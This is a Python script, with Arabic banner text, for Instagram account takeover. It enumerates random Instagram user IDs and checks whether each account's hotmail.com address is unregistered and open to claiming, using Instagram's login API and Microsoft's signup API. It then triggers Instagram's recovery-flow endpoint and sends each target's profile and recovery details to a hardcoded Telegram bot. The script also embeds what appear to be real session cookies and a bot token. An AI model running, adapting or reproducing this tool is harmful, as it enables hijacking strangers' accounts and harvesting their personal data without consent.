import requests
import random
import json
import datetime
from uuid import uuid4		
uid = str(uuid4())
import time
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[1;32m' #اخضر
token = '6804250062:AAGPqu0J3yQUiQy4p2I0r7jzFtHZZRPrkMc'
def azz():
 azro = (f"""{X} 
 اهلا بكم بعالم جديد وهو عالم الصيد 🤓
{F}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Z}┃{F} < hotmail > اداه صيد متاحات
{Z}┃----------------------
{Z}┃  {F}نورت اداه > حسو ال علي 
{Z}┃ ---------------------
{Z}┃  {X}HSO  > مبرمج الاداه 
{Z}┃ ----------------------
{Z}┃  {F}@PY_50 > معرفي تلكرام
{Z}┃ ----------------------
{Z}┃  {X}@llxxx3 > معرف قناتي 
{F}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

 for azoz in azro.splitlines():
  time.sleep(0.08)
  print(azoz)

azz()
tim = datetime.datetime.now()
print('\n')
print(f'{X}Time : {tim} \n{F}Cond : التفعيل نشط الان • ')
print(Z+'*'*60)
def info(email):
	use = str(email)
	user = use.split('@')[0]
	
	url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'

	he = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cookie': 'mid=ZHTlnQALAAFHZAE8G64BeLHXNMv6; ig_did=ACB29C06-4F89-4B7A-9D37-DC433D1E9398; ig_nrcb=1; datr=nUZ1ZAphhPG3siVLQu3QFbkq; fbm_124024574287414=base_domain=.instagram.com; csrftoken=1gI1BSItuCt7GpIB7BL3KCrapTfKligx; ds_user_id=55002803434; sessionid=55002803434%3A1m1laRSPbJaoKD%3A24%3AAYdWXJwfQhhN68tU0NIkcNODEtrIYnAgKCWPkrp3Rg; shbid="12254\05455002803434\0541717693792:01f7d20c44658c09775e0f963159681bf19a10be70bbe95b497a89f112ac2fc01ab50da0"; shbts="1686157792\05455002803434\0541717693792:01f7c175c7d720e51402db9b91b351fab16619ea5a91f0ce421bc4c9827bce14e62426c5"; fbsr_124024574287414=Z3GOftVJ7wWK4lDsT4vYGKDlPKHv5vYXWQpT8AYi130.eyJ1c2VyX2lkIjoiMTAwMDg3NjM5MTE3ODM3IiwiY29kZSI6IkFRRHRIbWwtakhjY25sQmxidDJmcGpDZmtLV2stb2FQY0lLbHpWQWtfMUlhLTNqMF9wdlhsaFUyTnJvYXRsT2lvUmJfSXNzc19oSXFyYzFRX3BLZ1RaX1RSTEhCbGpzRTFHZkFjWWJoX0Q4aVVwYWdSR2Q0bVNXcUVwai1SajlkT1J5RmxadzZHbWZCc0ZCbVdUY0RDNDAzUFVnTzV2TVBONk1UcmpSUDlpTU85dFdSc0hURFdsUVhrNDJycVhvbzM2SHlnYXRNdDJMRWlNNUZrcmVfRWtiWGUzTTlqdzY4enpKT2RVUjlIUmt2TUlXcWZqQ2RUc3FmYUo5MWowUF95bm9aLVZCSnpmb0xuSkt3MV9JTkFTQzdEZmM3ZURIeDFiTkFyRS1SQ1FhYUp3ZWtydVdzMFBYaV9pTDdYTlZrRTg5Yy1oYWVrWVI1YU45cDhwVXp0ZXBsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUhiWkNnM3M0UXJRZmhyOXRaQm5mdHI2cTlsYXJNMnpRaFpDZTNlczJOTGkwNGc4NGJaQldRTWs4VlpDWkNZMVZ3ak52azJ4M0d0VkxaQTdPajhZWkFkNklDdUxtMjI0NllhVTZQdXRlMk1PU3haQnpxbDhxUnU2UDhRYTZnRXhpUGRRbHB5WWJYSmVRczB3N2UzdFRxZXdnQWdUYXNpYzRjd0d3MHpaQUxTdXNCVUN3Y0JnVnk3MmdaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjg2MjA3NDQ4fQ; rur="ODN\05455002803434\0541717743459:01f7dc2b656c6f698ae45a64240745cb3e01e62cb90350349fcf91dba76a5d92e481be60"',
    'Referer': 'https://www.instagram.com/5u2.a/',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Viewport-Width': '624',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': '1gI1BSItuCt7GpIB7BL3KCrapTfKligx',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR2f295htsHXPFyt6RxGipeoIQHM6Vikj5SuhBSAT7RgrCSq',
    'X-Requested-With': 'XMLHttpRequest',}

	rr = requests.get(url,headers=he).json()
	bio = rr['data']['user']['biography']
	fol = rr['data']['user']['edge_followed_by']['count']
	fo = rr['data']['user']['edge_follow']['count']
	name = rr['data']['user']['full_name']
	id = rr['data']['user']['id']

	ur = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
	ree = ur.json();data = ree['date']

	try:
		url = 'https://z-p42.i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
	
		he = {
'X-Pigeon-Session-Id':'39ff0498-3763-4284-a7b8-bbb2cfa1539f',
'X-Pigeon-Rawclienttime':'1709921703.417',
'X-IG-Connection-Speed':'-1kbps',
'X-IG-Bandwidth-Speed-KBPS':'-1.000',
'X-IG-Bandwidth-TotalBytes-B':'0',
'X-IG-Bandwidth-TotalTime-MS':'0',
'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
'X-IG-Connection-Type':'MOBILE(LTE)',
'X-IG-Capabilities':'3brTvw==',
'X-IG-App-ID':'567067343352427',
'User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 480dpi; 1080x2137; HUAWEI/HONOR; JSN-L22; HWJSN-H; kirin710; ar_AE; 161478664)',
'Accept-Language':'ar-AE, en-US',
'Cookie':'mid=ZetVgwABAAHq5maDSaHCXScKn9FU; csrftoken=54rptEn5fe7iKClCWIwpYPegblu2IBxC',
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
'Accept-Encoding':'gzip, deflate',
'Host':'z-p42.i.instagram.com',
'X-FB-HTTP-Engine':'Liger',
'Connection':'keep-alive',
'Content-Length':'365',
}
		st=requests.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/')
		cs = st.cookies.get_dict()['csrftoken']
		da = {"_csrftoken": cs,"adid": uid,"guid": uid,"device_id":"android-c687f078f8b6b4de","query": user}
		ror = requests.post(url,headers=he,data=da).json()
		rss = str(ror['email'])
		tt = f'''
• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • 
username : {user}
name : {name}
Followers : {fol}
follows : {fo}
Date created : {data}
ID Account : {id}
The rest : {rss}
Link : https://www.instagram.com/{user}

• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • 
'''
		print(tt)
		
		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id=1418250346&text={tt}')
		
	except :
		tt = f'''
• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • 

username : {user}
name : {name}
Followers : {fol}
follows : {fo}
Date created : {data}
ID Account : {id}
The rest : {ror}
Link : https://www.instagram.com/{user}

• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • 
'''
		print(tt)
		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id=1418250346&text={tt}')

def hott(email):
	email = email
	
	req=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
	amsc=req.cookies.get_dict()['amsc']
	
	encoded=req.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]

	canary = encoded.encode().decode('unicode-escape')
	
	cookies = {
    'mkt': 'ar-EG',
    'MUID': 'e06fa5b38400404da6b1257a5d5b9766',
    'MicrosoftApplicationsTelemetryDeviceId': '5f903a99-e0c6-4ad3-9155-ef5d3a533ddf',
    'MSFPC': 'GUID=d85865a9134d4139873d52e79867c60d&HASH=d858&LV=202403&V=4&LU=1710082468646',
    'clrc': '{%2219793%22%3a[%22SLD3q8F4%22%2c%22eb4C4Wvc%22%2c%22PNVGSRqC%22]%2c%2219795%22%3a[%22d7PFy/1V%22%2c%22+VC+x0R6%22%2c%22FutSZdvn%22]}',
    'mkt1': 'ar-EG',
    'amsc': amsc,
    'fptctx2': 'taBcrIH61PuCVH7eNCyH0OPzOrGnaCb%252f7mTjN%252fuIW2uY1v7S8UNUcWAPbHAw4boHADa7vjBmUTggNLVYYPQLBRyNP6q3qWNJs2Nt04bbrOJstSQM%252fj%252f6SEl5%252fEcJorGWZHGRWyIr7H6cFFy31kFCFfnUdC1ItHRNKcfMW2WOv4omzT%252fqkfh%252fjLaCZcxEXL9p8lNx9WwV%252bz2dAXANrUdBBzS3qOpAL%252b4ClOpWKVZ0CVEp%252boaSowbwJivQyW2Q6bZOhtQ1JxRQwNXSxR5r6ALzBGKsQUKgfBBDCc1rL%252byjGkn5UFl83jxIaTbLQPMT9cTI7L4%252b8hHNikx%252fgn0JU%252f9Hpg%253d%253d',
}

	headers = {
    'authority': 'signup.live.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'canary': canary,
    'content-type': 'application/json',
    'hpgid': '200639',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/signup?cobrandid=90015&id=292841&contextid=7AE4DAFE2A446C55&opid=8FE2B0C92C6F35ED&bk=1710232118&sru=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26id%3d292841%26contextid%3d7AE4DAFE2A446C55%26opid%3d8FE2B0C92C6F35ED%26mkt%3dAR-EG%26lc%3d3073%26bk%3d1710232118%26uaid%3d54d818a9995941ebaeba13474b133db9&uiflavor=web&lic=1&mkt=AR-EG&lc=3073&uaid=54d818a9995941ebaeba13474b133db9',
    'scid': '100118',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'tcxt': 'sHaBK7pasaZ+390khh6/cXmDwve3ehvF0GzSB0Uut87NDqUn+cUwpMT3JMDR5KtTYuCx6ViyWVG/uyavKdKd+wlymOlqtSY3ZabICHWVFUK/ZlFcfxxYHfbptY6qG69H2SslkL3huciB1T7s8F43SFtERK4xDuJWRo9kGzUrlLStR3FKscJHeUhJUqfhwgbL6lhvewjDmYZo4ymbVsORvD7zPFX+2buJ1GoQvwzC2IxnsGCCxZ3pBeIifZsjth86iMau8Vt7WFADWEtryMXeQ9Up+dv9dEC80vU8U4ZIxcDgCuRmvhWFr0mOPphv+huhne7IUAGU4kSNlzkYlu3U/4GqQ2WU0yb6I9FdJ3mcf3s93EA9pTNe35vHXXIvE1lVBJQe/ADYll20p/nWufs5mricbtki3mEQ2SbzF1iUoMIiBh4gBCvtosRvKTBd2PChMXuWKxzIpLtoLThBUAEJjplNzCWkv7vP3ojSExoqgVqlKyjPI+mn+ZCIVBTCRtUYEXnXmc95xl52ACctgservjMEvbVaocbLKIewe3V7UeHJ64TEyQxrC7De/THlfY3:2:3',
    'uaid': '54d818a9995941ebaeba13474b133db9',
    'uiflvr': '1001',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-ms-apitransport': 'xhr',
    'x-ms-apiversion': '2',
}

	json_data = {
    'signInName': email,
    'uaid': '54d818a9995941ebaeba13474b133db9',
    'includeSuggestions': True,
    'uiflvr': 1001,
    'scid': 100118,
    'hpgid': 200639,
}

	rr = requests.post(
    'https://signup.live.com/API/CheckAvailableSigninNames?cobrandid=90015&id=292841&contextid=7AE4DAFE2A446C55&opid=8FE2B0C92C6F35ED&bk=1710232118&sru=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26id%3d292841%26contextid%3d7AE4DAFE2A446C55%26opid%3d8FE2B0C92C6F35ED%26mkt%3dAR-EG%26lc%3d3073%26bk%3d1710232118%26uaid%3d54d818a9995941ebaeba13474b133db9&uiflavor=web&lic=1&mkt=AR-EG&lc=3073&uaid=54d818a9995941ebaeba13474b133db9',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	if '"isAvailable":true' in rr.text:
		print(f'{F}Good Hotmail {email}')
		
		info(email)
		
	else:
		print(f'{X}Bad hotmail {email}')








def chk(us):
		email = us+'@hotmail.com'
		u='https://www.instagram.com/api/v1/web/accounts/login/ajax/'
		h={
            "accept": "*/*",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "1",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
            "sec-ch-ua-full-version-list": "\"Not A(Brand\";v=\"99.0.0.0\", \"Google Chrome\";v=\"121.0.6167.189\", \"Chromium\";v=\"121.0.6167.189\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": "\"\"",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-ch-ua-platform-version": "\"10.0.0\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "viewport-width": "600",
            "x-asbd-id": "129477",
            "x-csrftoken": "KxPbfWGOsKVtdot3jijIxIpNJx0dwT6o",
            "x-ig-app-id": "936619743392459",
            "x-ig-www-claim": "hmac.AR09U4rMiMBUELkVvR2STh6hGuOTSMIe6ITNuj95Jsm4YcGx",
            "x-instagram-ajax": "1011707155",
            "x-requested-with": "XMLHttpRequest"
        }

		tim = str(time.time()).split('.')[1]
		d={'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:uojffgkklkgmjr',
'username': f'{email}',
}
		r=requests.post(u,headers=h,data=d).text
		if('user":true')in r:
			print(f'{X}God insta {email}')
			hott(email)
		else:
			print(f'{Z}Bad insta : {email}')

      


def use():

	import requests,random
	from time import time
	from hashlib import md5
	from random import randrange
	from threading import Thread

	
	
	dd= '0987654321'
	while True:
		
		iy="".join(random.choice(dd)for i in range(7))
		il="".join(random.choice(dd)for i in range(8))
		kk=[f'{iy}',f'{il}']
		id = random.choice(kk)
		
		csrftoken = md5(str(time()).encode()).hexdigest()
		
		headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
    'x-csrftoken': csrftoken,
    }

		data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
}

		try:
			
			rr = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
			us=rr['data']['user']['username']
			chk(us)
		except TypeError:
			print('Erorr')

use()
